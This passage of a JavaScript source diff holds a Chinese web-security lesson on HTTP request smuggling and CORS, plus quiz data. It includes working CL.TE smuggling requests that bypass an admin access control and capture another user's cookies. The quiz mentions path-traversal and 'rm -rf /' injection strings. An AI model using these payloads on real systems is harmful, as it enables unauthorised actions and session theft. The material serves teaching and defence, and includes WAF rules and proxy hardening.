表示：前端服务器使用 <code>Transfer-Encoding</code> 确定请求边界，后端服务器使用 <code>Content-Length</code> 确定请求边界。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code>TE.CL 请求走私原理：\n\n前端（TE）看到的内容：               后端（CL）看到的内容：\n┌─────────────────────────┐         ┌─────────────────────────┐\n│ POST / HTTP/1.1         │         │ POST / HTTP/1.1         │\n│ Transfer-Encoding:chunked│         │ Content-Length: 3       │\n│ Content-Length: 3       │         │                         │\n│                         │         │ 8   ←── 块大小           │\n│ 8                       │         │                         │\n│ 0                       │         │ 0                       │\n│                         │         │                         │\n│ GET /admin HTTP/1.1  ←──│── 走私  │ GET /admin HTTP/1.1  ←──│── 被当作\n│ Host: target.com        │         │ Host: target.com        │    请求体\n│                         │         │                         │    的一部分\n└─────────────────────────┘         └─────────────────────────┘\n\n前端看到 chunked：                   后端看到 CL:3 → 只读3字节 \"8\\r\\n\"\n  块1: \"0\\r\\n\\r\\n\" → 结束            剩余内容被当作下一个请求\n  块2: \"GET /admin...\" → 新请求       → 解析错乱 → 走私成功</code></pre></div>\n\n<div class=\"checkpoint\" data-cp=\"2\"></div>\n\n<h3>六、走私攻击实战</h3>\n\n<h4>6.1 场景：绕过访问控制</h4>\n\n<p>CyberShop 的管理后台 <code>/admin</code> 只允许内网 IP 访问。前端 Nginx 负载均衡器配置了访问控制规则：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Nginx 负载均衡器的访问控制\nlocation /admin {\n    allow 10.0.0.0/8;     # 只允许内网\n    deny all;              # 拒绝外部访问\n}\n\n# 但 /api/* 路径对外部开放\nlocation /api/ {\n    proxy_pass http://backend:8080;\n}</code></pre></div>\n\n<p>问题是：前端 Nginx 使用 <code>Content-Length</code> 来确定请求边界，而后端 Tomcat 使用 <code>Transfer-Encoding</code> 来确定请求边界（CL.TE 漏洞）。</p>\n\n<h4>6.2 攻击：走私请求绕过前端访问控制</h4>\n\n<p>攻击者小 E 构造了以下请求：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-http\"># 走私请求 —— 绕过 /admin 访问控制\n\nPOST /api/search HTTP/1.1\nHost: www.cybershop.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 116\nTransfer-Encoding: chunked\n\n0\n\nPOST /admin/delete-user HTTP/1.1\nHost: www.cybershop.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 100\n\nuser_id=10086&action=delete&confirm=true&padding=xxxxxxxxxxxxxxxxxxxx</code></pre></div>\n\n<p><strong>前端 Nginx 的处理</strong>：</p>\n\n<ol>\n<li>请求路径为 <code>/api/search</code>，符合访问控制规则，允许通过</li>\n<li>读取 <code>Content-Length: 116</code> 字节作为请求体</li>\n<li>整个请求（包括\"隐藏\"的管理员操作）被当作一个合法的 <code>/api/search</code> 请求转发给后端</li>\n</ol>\n\n<p><strong>后端 Tomcat 的处理</strong>：</p>\n\n<ol>\n<li>看到 <code>Transfer-Encoding: chunked</code>，按分块格式解析</li>\n<li>第一个块大小为 <code>0</code>，认为 <code>/api/search</code> 请求体为空，处理该请求</li>\n<li>紧接着的 <code>POST /admin/delete-user</code> 被当作连接上的<strong>下一个请求</strong>来处理</li>\n<li>这个\"走私\"的请求来自前端代理（内网 IP <code>10.0.0.x</code>），绕过了访问控制</li>\n</ol>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code>请求走私的时间线：\n\n攻击者                 前端 Nginx              后端 Tomcat\n  │                       │                        │\n  │  POST /api/search     │                        │\n  │  CL: 116              │                        │\n  │  TE: chunked          │                        │\n  │  [走私内容]           │                        │\n  │──────────────────────>│                        │\n  │                       │  检查 /api/search → 允许 │\n  │                       │───────────────────────>│\n  │                       │                        │ 解析 chunked\n  │                       │                        │ → 块大小 0 → 请求结束\n  │                       │                        │ \n  │                       │                        │ 发现\"新请求\"：\n  │                       │                        │ POST /admin/delete-user\n  │                       │                        │ → 来自前端(内网IP)\n  │                       │                        │ → 访问控制通过！\n  │                       │                        │ → 执行删除操作！\n  │                       │                        │\n  │  200 OK (search)      │                        │\n  │<──────────────────────│<───────────────────────│</code></pre></div>\n\n<h4>6.3 攻击：窃取其他用户的请求</h4>\n\n<p>请求走私还可以用来窃取其他用户的请求内容（包括 Cookie 和认证令牌）。攻击者走私一个不完整的请求，使得下一个合法用户的请求内容被附加到攻击者可以访问的资源中：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-http\"># 走私一个不完整的 POST 请求，\"吞掉\"下一个用户的请求\n\nPOST /api/search HTTP/1.1\nHost: www.cybershop.com\nContent-Length: 130\nTransfer-Encoding: chunked\n\n0\n\nPOST /api/comment HTTP/1.1\nHost: www.cybershop.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 800\n\ncomment=STOLEN:</code></pre></div>\n\n<p><strong>效果</strong>：后端将 <code>POST /api/comment</code> 视为一个新请求，但它是不完整的。当<strong>下一个用户</strong>的合法请求（例如 <code>GET /api/profile</code>）到达后端时，该请求的全部内容会被当作上述 <code>POST /api/comment</code> 的请求体。这样，下一个用户的 Cookie、会话令牌等敏感信息就被存储到了评论中，攻击者可以读取该评论来获取。</p>\n\n<div class=\"callout warn\"><div class=\"callout-title\">注意</div><p>HTTP 请求走私是一种高危漏洞，影响范围广泛。它不针对特定的应用程序代码，而是针对 Web 基础设施（代理、负载均衡器、Web 服务器）。一次成功的走私攻击可能影响经过同一前端的所有用户的请求。在实际的漏洞赏金计划中，HTTP 请求走私通常被评为 Critical 或 High 级别。</p></div>\n\n<h3>七、防御措施</h3>\n\n<h4>7.1 CORS 防御总结</h4>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 生产环境推荐的 CORS 安全配置\n\nimport re\n\n# 严格的可信源白名单\nTRUSTED_ORIGINS = {\n    'https://www.cybershop.com',\n    'https://admin.cybershop.com',\n    'https://mobile.cybershop.com',\n}\n\n# 用于内部 API（不需要 CORS）\nINTERNAL_PATHS = {'/api/internal', '/api/debug', '/api/health'}\n\ndef secure_cors_handler(request, response):\n    origin = request.headers.get('Origin', '')\n    path = request.path\n    \n    # 内部 API 完全禁止 CORS\n    if any(path.startswith(p) for p in INTERNAL_PATHS):\n        return response\n    \n    # 严格匹配 Origin 白名单\n    if origin in TRUSTED_ORIGINS:\n        response.headers['Access-Control-Allow-Origin'] = origin\n        response.headers['Access-Control-Allow-Credentials'] = 'true'\n        response.headers['Access-Control-Allow-Methods'] = 'GET, POST'\n        response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'\n        response.headers['Access-Control-Max-Age'] = '3600'\n        response.headers['Vary'] = 'Origin'  # 防止 CDN 缓存问题\n    \n    # 不在白名单中的 Origin → 不设置任何 CORS 头部\n    # 浏览器将自动阻止 JavaScript 读取响应\n    return response</code></pre></div>\n\n<h4>7.2 HTTP 请求走私防御</h4>\n\n<p><strong>1. 使用 HTTP/2 端到端通信</strong></p>\n\n<p>HTTP/2 使用帧（Frame）机制来分隔请求，每个请求都有明确的帧边界，不再依赖 <code>Content-Length</code> 或 <code>Transfer-Encoding</code> 来确定请求长度。这从根本上消除了 CL/TE 解析不一致的问题。</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code>HTTP/1.1（存在走私风险）：           HTTP/2（帧机制，无歧义）：\n┌──────────────────────┐            ┌──────────────────────┐\n│ POST / HTTP/1.1      │            │ ┌──────────────────┐ │\n│ CL: ??  TE: chunked  │ ← 歧义     │ │ HEADERS Frame    │ │ ← 明确\n│ [请求体在哪里结束？] │            │ │ :method: POST    │ │\n│                      │            │ │ :path: /         │ │\n│ [下一个请求从哪开始？]│            │ └──────────────────┘ │\n└──────────────────────┘            │ ┌──────────────────┐ │\n                                    │ │ DATA Frame       │ │ ← 明确\n                                    │ │ [完整请求体]      │ │\n                                    │ │ END_STREAM flag  │ │ ← 结束标记\n                                    │ └──────────────────┘ │\n                                    └──────────────────────┘</code></pre></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">推荐</div><p>尽可能在前端到后端的全链路中使用 HTTP/2。如果前端到客户端仍使用 HTTP/1.1，至少确保前端到后端之间使用 HTTP/2 通信。主流反向代理（Nginx 1.25.1+、HAProxy 2.4+、Envoy）都支持 HTTP/2 后端连接。</p></div>\n\n<p><strong>2. 统一 CL/TE 处理策略</strong></p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># Nginx 配置：统一使用 Content-Length，拒绝 Transfer-Encoding 转发\n\n# 在 proxy 配置中强制使用 HTTP/1.1 并禁用 chunked 转发\nproxy_http_version 1.1;\nproxy_set_header Connection \"\";\n\n# 拒绝同时包含 CL 和 TE 的请求\n# 使用 Nginx 的 Lua 模块进行检测\naccess_by_lua_block {\n    local cl = ngx.req.get_headers()[\"Content-Length\"]\n    local te = ngx.req.get_headers()[\"Transfer-Encoding\"]\n    if cl and te then\n        ngx.log(ngx.WARN, \"Request with both CL and TE from: \", ngx.var.remote_addr)\n        ngx.exit(400)  -- 直接拒绝\n    end\n}\n\n# 或者使用更简单的方案：在前端直接丢弃 TE 头部\nproxy_set_header Transfer-Encoding \"\";</code></pre></div>\n\n<p><strong>3. 保持代理软件更新</strong></p>\n\n<p>HTTP 请求走私漏洞往往存在于代理服务器和负载均衡器中。保持软件更新是防御的基础：</p>\n\n<ul>\n<li><strong>Nginx</strong>：更新至最新版本，关注安全公告</li>\n<li><strong>HAProxy</strong>：更新至 2.x 系列最新稳定版</li>\n<li><strong>Apache HTTP Server</strong>：关注 mod_proxy 的安全更新</li>\n<li><strong>Envoy</strong>：更新至最新版本</li>\n<li><strong>AWS ALB/CloudFront</strong>：关注 AWS 安全公告</li>\n</ul>\n\n<p><strong>4. 使用 Web 应用防火墙（WAF）检测</strong></p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\"># WAF 规则示例：检测可疑的 CL/TE 组合\n# ModSecurity 规则\n\n# 检测同时包含 Content-Length 和 Transfer-Encoding 的请求\nSecRule REQUEST_HEADERS:Content-Length \".*\" \\\n    \"chain,id:1001,phase:1,deny,status:400,\\\n     msg:'Possible HTTP Request Smuggling - CL and TE present',\\\n     severity:'CRITICAL'\"\n    SecRule REQUEST_HEADERS:Transfer-Encoding \"!^$\"\n\n# 检测 Transfer-Encoding 头部中的异常值\nSecRule REQUEST_HEADERS:Transfer-Encoding \\\n    \"!(?i)^chunked$\" \\\n    \"id:1002,phase:1,deny,status:400,\\\n     msg:'Suspicious Transfer-Encoding value',\\\n     severity:'WARNING'\"</code></pre></div>\n\n<p><strong>5. 连接管理策略</strong></p>\n\n<ul>\n<li><strong>禁用后端连接复用</strong>：为每个请求使用独立的后端连接（性能代价较大，但最安全）</li>\n<li><strong>限制连接上的请求数量</strong>：设置 <code>keepalive_requests</code> 限制，定期轮换连接</li>\n<li><strong>前端请求规范化</strong>：在前端统一将请求规范化为 CL 或 TE 格式后再转发</li>\n</ul>\n\n<h3>八、Web 安全模块总结</h3>\n\n<p>恭喜你！完成本章后，你已经学完了整个 Web 安全模块。让我们回顾一下本模块涵盖的所有攻击类型：</p>\n\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code>┌─────────────────────────────────────────────────────────────────┐\n│                    Web 安全模块 · 知识图谱                        │\n├─────────────────────────────────────────────────────────────────┤\n│                                                                 │\n│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐         │\n│  │  SQL 注入    │    │   XSS       │    │   CSRF      │         │\n│  │             │    │             │    │             │         │\n│  │ 输入 → 数据 │    │ 输入 → 脚本 │    │ 浏览器 →    │         │\n│  │   库查询    │    │   注入页面  │    │   伪造请求  │         │\n│  │             │    │             │    │             │         │\n│  │ 防御：参数化│    │ 防御：输出  │    │ 防御：Token │         │\n│  │   查询      │    │   编码      │    │   + SameSite│         │\n│  └─────────────┘    └─────────────┘    └─────────────┘         │\n│                                                                 │\n│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐         │\n│  │  文件上传    │    │  命令注入    │    │  XXE        │         │\n│  │             │    │             │    │             │         │\n│  │ 恶意文件    │    │ 系统命令    │    │ XML 外部    │         │\n│  │   绕过验证  │    │   拼接执行  │    │   实体注入  │         │\n│  │             │    │             │    │             │         │\n│  │ 防御：白名单│    │ 防御：避免  │    │ 防御：禁用  │         │\n│  │   + 类型检测│    │   shell调用 │    │   外部实体  │         │\n│  └─────────────┘    └─────────────┘    └─────────────┘         │\n│                                                                 │\n│  ┌─────────────┐    ┌─────────────┐                            │\n│  │  SSRF       │    │ CORS 错误   │ ← 本章                    │\n│  │             │    │   配置      │                            │\n│  │ 服务端发起  │    │             │                            │\n│  │   恶意请求  │    │ 跨域数据    │                            │\n│  │             │    │   窃取      │                            │\n│  │ 防御：URL   │    │             │                            │\n│  │   白名单    │    │ 防御：严格  │                            │\n│  └─────────────┘    │   Origin    │                            │\n│                     │   白名单    │                            │\n│                     └─────────────┘                            │\n│                                                                 │\n│  ┌─────────────┐                                               │\n│  │ HTTP 请求   │ ← 本章                                       │\n│  │   走私      │                                               │\n│  │             │                                               │\n│  │ CL/TE 解析  │                                               │\n│  │   不一致    │                                               │\n│  │             │                                               │\n│  │ 防御：HTTP/2│                                               │\n│  │   + 统一解析│                                               │\n│  └─────────────┘                                               │\n│                                                                 │\n└─────────────────────────────────────────────────────────────────┘</code></pre></div>\n\n<h4>防御者心态</h4>\n\n<p>通过本模块的学习，你应该已经建立起了一个重要的思维方式——<strong>防御者心态</strong>。攻击者只需要找到一个弱点就能突破防线，而防御者必须保护每一个可能的攻击面。这看似是一场不对称的博弈，但优秀的防御者可以通过以下原则来缩小攻击面：</p>\n\n<ol>\n<li><strong>纵深防御（Defense in Depth）</strong>：不要依赖单一的安全措施。即使一层防御被突破，后续的防线仍然能够发挥作用。例如：输入验证 + 参数化查询 + 最小权限数据库账户。</li>\n<li><strong>最小权限（Least Privilege）</strong>：每个组件只拥有完成任务所需的最小权限。Web 应用不应该以 root 身份运行，CORS 不应该允许所有来源，数据库账户不应该拥有不必要的权限。</li>\n<li><strong>安全默认值（Secure by Default）</strong>：默认配置应该是安全的。CORS 默认应该拒绝所有跨域请求，文件上传默认应该拒绝所有类型，API 默认应该要求认证。</li>\n<li><strong>持续审计（Continuous Audit）</strong>：安全不是一次性的工作。定期进行代码审计、渗透测试、依赖更新和配置检查。</li>\n<li><strong>理解协议（Understand the Protocol）</strong>：很多安全问题的根源在于对底层协议（HTTP、TCP、DNS）的理解不足。不要盲目信任框架和中间件的默认行为。</li>\n</ol>\n\n<div class=\"callout default\"><div class=\"callout-title\">模块结语</div><p>Web 安全是一个不断演进的领域。新的框架、新的协议、新的架构模式会带来新的攻击面。本模块教给你的不仅是具体的攻击技术和防御方法，更重要的是<strong>一种安全思维：永远不要假设输入是可信的，永远不要假设配置是正确的，永远不要假设协议实现是无歧义的</strong>。带着这种思维方式，无论技术如何变化，你都能够发现和防御新的安全威胁。</p></div>\n\n<div class=\"callout success\"><div class=\"callout-title\">本章小结与实战建议</div><p>恭喜你完成了 Web 安全模块的全部学习！从 SQL 注入到 HTTP 请求走私，你已经掌握了 Web 攻防的核心技术栈。接下来，建议通过 CTF 实战来巩固所学：</p><button class=\"practice-link-btn\" onclick=\"navigate('ctf')\">▶ 进入 CTF 竞技场</button></div>";
+
+// ============================================================
+// CHECKPOINT QUIZ DATA
+// ============================================================
+
+// ============================================================
+// CHECKPOINT QUIZ DATA (all modules merged)
+// ============================================================
+const SECTION_CHECKPOINTS = {
+  "programming": [
+    {
+      "question": "在 Python 中，以下哪个类型最适合存储 IP 地址（如 \"192.168.1.1\"）？",
+      "options": [
+        "int",
+        "float",
+        "str",
+        "bool"
+      ],
+      "answer": 2,
+      "explanation": "IP 地址包含点号分隔的四段数字，是文本格式，应该用字符串（str）存储。虽然每段是数字，但 IP 地址作为整体不是数值类型。"
+    },
+    {
+      "question": "执行 int(\"80\") 和 int(\"abc\") 的结果分别是什么？",
+      "options": [
+        "都返回整数",
+        "第一个返回 80，第二个抛出 ValueError",
+        "第一个返回 80，第二个返回 0",
+        "都抛出异常"
+      ],
+      "answer": 1,
+      "explanation": "int() 可以将合法的数字字符串转为整数，但如果字符串不是合法数字格式，会抛出 ValueError。安全工具中必须用 try/except 处理这种情况。"
+    },
+    {
+      "question": "以下代码的输出是什么？\nport_services = {22: \"SSH\", 80: \"HTTP\"}\nprint(port_services.get(443, \"Unknown\"))",
+      "options": [
+        "None",
+        "报错 KeyError",
+        "Unknown",
+        "443"
+      ],
+      "answer": 2,
+      "explanation": "dict.get(key, default) 方法在键不存在时返回 default 值，而不是抛出异常。这是安全工具中处理可选数据的常用方式。"
+    },
+    {
+      "question": "为什么从网络接收的数据在做数学运算前必须转换类型？",
+      "options": [
+        "网络数据是加密的",
+        "网络数据永远是 bytes/str 类型",
+        "Python 不允许网络数据参与运算",
+        "转换类型可以加速运算"
+      ],
+      "answer": 1,
+      "explanation": "从 socket.recv() 或 HTTP 响应获取的数据是 bytes 类型，解码后是 str 类型。要作为端口号、状态码等数值使用，必须用 int() 转换。"
+    }
+  ],
+  "prog-01-02": [
+    {
+      "question": "以下 Python 代码中，check_vulnerability(\"Apache/2.4.49 (Ubuntu)\") 会返回什么？",
+      "options": [
+        "✅ 未发现已知漏洞特征",
+        "🔴 Apache 2.4.49 — CVE-2021-41773 路径穿越",
+        "无法识别",
+        "报错"
+      ],
+      "answer": 1,
+      "explanation": "函数中检查 banner.lower() 是否包含 \"apache/2.4.49\"，匹配后返回对应的 CVE 信息。条件分支从上到下匹配第一个符合条件的分支。"
+    },
+    {
+      "question": "为什么 def func(lst=[]) 是 Python 中的常见陷阱？",
+      "options": [
+        "语法错误",
+        "列表作为默认参数会在所有调用间共享",
+        "列表不能做默认参数",
+        "会导致内存泄漏"
+      ],
+      "answer": 1,
+      "explanation": "Python 的可变默认参数在函数定义时只创建一次。如果函数内修改了列表，后续调用会看到之前的修改。正确做法是用 lst=None，函数内 lst = lst or []。"
+    },
+    {
+      "question": "for port in [22, 80, 443] 循环会执行几次？",
+      "options": [
+        "1 次",
+        "2 次",
+        "3 次",
+        "无限次"
+      ],
+      "answer": 2,
+      "explanation": "for 循环会遍历列表中的每个元素，列表有 3 个元素，所以循环执行 3 次。"
+    }
+  ],
+  "prog-02": [
+    {
+      "question": "处理 GB 级日志文件时，以下哪种读取方式最安全？",
+      "options": [
+        "f.read() 一次性读入",
+        "f.readlines() 读入所有行",
+        "for line in f: 逐行处理",
+        "f.read(1000000) 每次读 1MB"
+      ],
+      "answer": 2,
+      "explanation": "逐行读取（for line in f）只保持当前行在内存中，内存使用恒定。一次性读取大文件会导致内存耗尽（OOM），这在安全工具中可能被利用为 DoS 攻击。"
+    },
+    {
+      "question": "以下代码中，如果文件不存在会发生什么？\ntry:\n    with open(path) as f: data = f.read()\nexcept FileNotFoundError:\n    data = \"default\"",
+      "options": [
+        "程序崩溃",
+        "data 被赋值为 \"default\"",
+        "data 为 None",
+        "无限重试"
+      ],
+      "answer": 1,
+      "explanation": "try/except 捕获了 FileNotFoundError 异常，执行 except 块中的代码，将 data 赋值为默认值。这是优雅降级（graceful degradation）的典型用法。"
+    },
+    {
+      "question": "路径穿越攻击中，攻击者通常使用什么来跳出预期目录？",
+      "options": [
+        "绝对路径",
+        "../ 序列",
+        "URL 编码",
+        "通配符 *"
+      ],
+      "answer": 1,
+      "explanation": "../ 表示上级目录。攻击者通过 ../../../etc/passwd 可以跳出应用目录，访问系统敏感文件。防御方法是用 Path.resolve() 后检查是否在基础目录内。"
+    }
+  ],
+  "prog-02-02": [
+    {
+      "question": "socket.AF_INET 和 socket.SOCK_STREAM 分别代表什么？",
+      "options": [
+        "IPv6 和 UDP",
+        "IPv4 和 TCP",
+        "IPv4 和 UDP",
+        "IPv6 和 TCP"
+      ],
+      "answer": 1,
+      "explanation": "AF_INET 表示 IPv4 地址族（AF_INET6 是 IPv6），SOCK_STREAM 表示 TCP（面向连接的流式传输），SOCK_DGRAM 表示 UDP。"
+    },
+    {
+      "question": "为什么端口扫描时必须设置 socket.settimeout()？",
+      "options": [
+        "加速扫描",
+        "防止程序在无响应时无限等待",
+        "减少网络流量",
+        "绕过防火墙"
+      ],
+      "answer": 1,
+      "explanation": "如果不设置超时，当目标端口被防火墙过滤（不返回任何响应）时，connect() 会等待很长时间（默认可能 75 秒以上）。设置短超时（如 2-3 秒）可以加快扫描速度。"
+    },
+    {
+      "question": "TCP 扫描和 UDP 扫描的主要区别是什么？",
+      "options": [
+        "TCP 更快",
+        "TCP 需要三次握手建立连接，UDP 无连接",
+        "UDP 更准确",
+        "TCP 只能扫描 Web 端口"
+      ],
+      "answer": 1,
+      "explanation": "TCP 是面向连接的协议，通过三次握手可以明确判断端口状态。UDP 是无连接的，很多服务不响应空包，导致超时无法区分\"开放\"和\"被过滤\"。"
+    }
+  ],
+  "prog-03": [
+    {
+      "question": "在 Linux 中，find / -perm -4000 -type f 这个命令的作用是什么？",
+      "options": [
+        "查找所有普通文件",
+        "查找 SUID 文件（可能的提权向量）",
+        "查找 4000 天前的文件",
+        "查找权限为 4000 的目录"
+      ],
+      "answer": 1,
+      "explanation": "-perm -4000 查找设置了 SUID 位的文件。这些文件以文件所有者的权限执行，如果被恶意利用可能导致权限提升。安全评估中这是标准检查项。"
+    },
+    {
+      "question": "grep \"Failed password\" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn 这个管道链做了什么？",
+      "options": [
+        "统计失败登录的次数",
+        "找出 SSH 暴力破解攻击的 IP 并按频率排序",
+        "删除日志中的失败记录",
+        "统计所有登录用户"
+      ],
+      "answer": 1,
+      "explanation": "这个管道链：1) 筛选失败登录记录；2) 提取 IP 地址；3) 排序；4) 去重计数；5) 按次数倒序排列。这是检测暴力破解攻击的经典命令。"
+    },
+    {
+      "question": "Shell 脚本中 set -euo pipefail 的作用是什么？",
+      "options": [
+        "设置变量",
+        "让脚本在出错时立即退出，使用未定义变量时报错",
+        "设置管道模式",
+        "开启调试模式"
+      ],
+      "answer": 1,
+      "explanation": "-e 表示命令失败时退出，-u 表示使用未定义变量时报错，-o pipefail 表示管道中任一命令失败时退出。这三条是安全 Shell 编程的铁律。"
+    },
+    {
+      "question": "Shell 脚本中最严重的安全风险是什么？",
+      "options": [
+        "变量名太长",
+        "命令注入——用户输入被直接拼接到命令中",
+        "注释太多",
+        "使用 #!/bin/bash"
+      ],
+      "answer": 1,
+      "explanation": "如果用户输入包含 ; rm -rf / 这样的恶意内容，被直接拼接到命令中会导致灾难性后果。必须用引号包裹变量、验证输入格式。"
+    }
+  ],
+  "prog-04": [
+    {
+      "question": "C 语言中，int *ptr = &value 这条语句做了什么？",
+      "options": [
+        "把 value 的值赋给 ptr",
+        "把 value 的地址存入 ptr（ptr 成为指向 value 的指针）",
+        "创建一个新的整数",
+        "比较 ptr 和 value"
+      ],
+      "answer": 1,
+      "explanation": "& 是取地址运算符，&value 获取 value 的内存地址。int *ptr 声明一个指向 int 的指针，将 value 的地址存入 ptr。之后通过 *ptr 可以读写 value。"
+    },
+    {
+      "question": "为什么 strcpy(buffer, input) 是危险的？",
+      "options": [
+        "速度太慢",
+        "不检查目标缓冲区大小，可能导致缓冲区溢出",
+        "会加密数据",
+        "只支持 ASCII"
+      ],
+      "answer": 1,
+      "explanation": "strcpy 不检查目标缓冲区大小，如果 input 比 buffer 长，多余的数据会覆盖 buffer 后面的内存，可能覆盖函数返回地址导致代码执行。应使用 strncpy 并限制长度。"
+    },
+    {
+      "question": "程序内存布局中，栈（Stack）主要存储什么？",
+      "options": [
+        "全局变量",
+        "动态分配的数据（malloc）",
+        "局部变量、函数参数和返回地址",
+        "程序代码"
+      ],
+      "answer": 2,
+      "explanation": "栈存储局部变量、函数参数和返回地址。每次函数调用会创建一个栈帧。栈溢出攻击就是利用缓冲区溢出覆盖返回地址来劫持程序执行。"
+    }
+  ],
+  "prog-04-02": [
+    {
+      "question": "栈缓冲区溢出攻击的核心原理是什么？",
+      "options": [
+        "删除栈上的数据",
+        "向缓冲区写入超过其大小的数据，覆盖返回地址",
+        "增加栈的大小",
+        "加密栈上的数据"
+      ],
+      "answer": 1,
+      "explanation": "栈上的局部变量和返回地址相邻排列。向缓冲区写入超量数据会覆盖保存的 EBP 和返回地址，攻击者可以让返回地址指向恶意代码，实现任意代码执行。"
+    },
+    {
+      "question": "Use-After-Free 漏洞的最佳防御方式是什么？",
+      "options": [
+        "增加内存大小",
+        "释放内存后立即将指针置为 NULL",
+        "不使用动态内存",
+        "使用更长的变量名"
+      ],
+      "answer": 1,
+      "explanation": "释放后立即置 NULL 可以确保：1) 后续意外使用会立即触发段错误而非隐蔽漏洞；2) 防止攻击者通过新分配占据同一内存来劫持旧指针的行为。"
+    },
+    {
+      "question": "printf(user_input) 为什么是安全漏洞？",
+      "options": [
+        "printf 太慢",
+        "如果 user_input 包含 %x %n 等格式符，可以泄露或写入内存",
+        "printf 不支持中文",
+        "会导致内存泄漏"
+      ],
+      "answer": 1,
+      "explanation": "当用户输入被直接作为格式字符串时，%x 可以泄露栈上的值（信息泄露），%n 可以向任意地址写入数据（任意写入）。安全写法是 printf(\"%s\", user_input)。"
+    }
+  ],
+  "prog-05": [
+    {
+      "question": "在安全工具中，检查 IP 是否在黑名单中，用什么数据结构最快？",
+      "options": [
+        "列表（list）",
+        "集合（set）",
+        "元组（tuple）",
+        "字符串（str）"
+      ],
+      "answer": 1,
+      "explanation": "集合基于哈希表，查找时间复杂度 O(1)。列表需要逐个比较，时间复杂度 O(n)。在 10 万个 IP 的黑名单中，集合比列表快 100-1000 倍。"
+    },
+    {
+      "question": "两个集合的差集运算 scan2 - scan1 在安全分析中有什么用？",
+      "options": [
+        "计算总端口数",
+        "找出第二次扫描中新出现的端口",
+        "删除重复端口",
+        "排序端口"
+      ],
+      "answer": 1,
+      "explanation": "集合差集 A - B 返回在 A 中但不在 B 中的元素。scan2 - scan1 就是第二次扫描中新开放的端口，可能是新部署的服务或入侵者开的后门。"
+    },
+    {
+      "question": "collections.deque 相比 list 的优势是什么？",
+      "options": [
+        "占内存更少",
+        "两端的添加和删除都是 O(1)",
+        "支持排序",
+        "自动去重"
+      ],
+      "answer": 1,
+      "explanation": "list 在头部插入是 O(n)，deque 两端操作都是 O(1)。deque 还支持 maxlen 参数实现滑动窗口，非常适合日志监控场景。"
+    },
+    {
+      "question": "sorted(results, key=lambda x: x[\"risk\"], reverse=True) 做了什么？",
+      "options": [
+        "按 risk 字段升序排列",
+        "按 risk 字段降序排列（最高风险在前）",
+        "删除 risk 字段",
+        "随机排列"
+      ],
+      "answer": 1,
+      "explanation": "sorted 的 key 参数指定排序依据，reverse=True 表示降序。这样可以得到风险评分最高的结果排在前面，方便安全分析师优先处理。"
+    }
+  ],
+  "prog-05-02": [
+    {
+      "question": "在 10 万个元素的列表中查找一个值，列表查找和集合查找的时间复杂度分别是？",
+      "options": [
+        "都是 O(n)",
+        "列表 O(n)，集合 O(1)",
+        "列表 O(1)，集合 O(n)",
+        "都是 O(1)"
+      ],
+      "answer": 1,
+      "explanation": "列表需要逐个比较（O(n)），集合用哈希表直接定位（O(1)）。这就是为什么 IP 黑名单应该用集合而不是列表。"
+    },
+    {
+      "question": "以下哪个是 O(n²) 复杂度的典型场景？",
+      "options": [
+        "遍历列表",
+        "字典查找",
+        "双重循环比对每对元素",
+        "二分查找"
+      ],
+      "answer": 2,
+      "explanation": "双重嵌套循环对 n 个元素两两比较，总操作次数约为 n²/2。在安全工具中，比如比对每对 IP 之间的关联关系就是 O(n²)，数据量大时会非常慢。"
+    },
+    {
+      "question": "处理 GB 级日志文件时，为什么推荐用生成器（yield）而非列表？",
+      "options": [
+        "生成器更快",
+        "生成器惰性求值，每次只保持一条数据在内存中",
+        "列表不支持大文件",
+        "生成器自动排序"
+      ],
+      "answer": 1,
+      "explanation": "生成器每次只产出一个元素，内存使用恒定 O(1)。列表需要把所有元素加载到内存，GB 级文件会导致内存耗尽。"
+    }
+  ],
+  "prog-06": [
+    {
+      "question": "正则表达式 \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3} 匹配什么？",
+      "options": [
+        "邮箱地址",
+        "IP 地址格式（如 192.168.1.1）",
+        "URL",
+        "MAC 地址"
+      ],
+      "answer": 1,
+      "explanation": "\\d{1,3} 匹配 1-3 位数字，\\. 匹配点号，重复四次匹配 IPv4 格式。但注意这不验证每段是否 ≤255，需要更严格的正才能完全验证 IP。"
+    },
+    {
+      "question": "ReDoS（正则拒绝服务）攻击的原理是什么？",
+      "options": [
+        "发送大量请求",
+        "利用嵌套量词正则（如 (a+)+）在特定输入下导致指数级匹配时间",
+        "DDoS 攻击",
+        "SQL 注入"
+      ],
+      "answer": 1,
+      "explanation": "某些正则模式（嵌套量词、重叠分支）在特定输入下会产生指数级的回溯。攻击者构造恶意输入让 WAF 或应用的正则引擎长时间卡住，导致拒绝服务。"
+    },
+    {
+      "question": "re.search() 和 re.findall() 的区别是什么？",
+      "options": [
+        "没有区别",
+        "search 返回第一个匹配，findall 返回所有匹配",
+        "search 更快",
+        "findall 只匹配数字"
+      ],
+      "answer": 1,
+      "explanation": "re.search() 找到第一个匹配就返回 Match 对象，re.findall() 返回所有匹配结果的列表。在日志分析中通常用 findall 获取所有匹配项。"
+    }
+  ],
+  "prog-07": [
+    {
+      "question": "为什么端口扫描适合用并发编程？",
+      "options": [
+        "端口扫描需要大量 CPU 计算",
+        "端口扫描的主要瓶颈是等待网络响应，等待时 CPU 空闲",
+        "Python 不支持串行扫描",
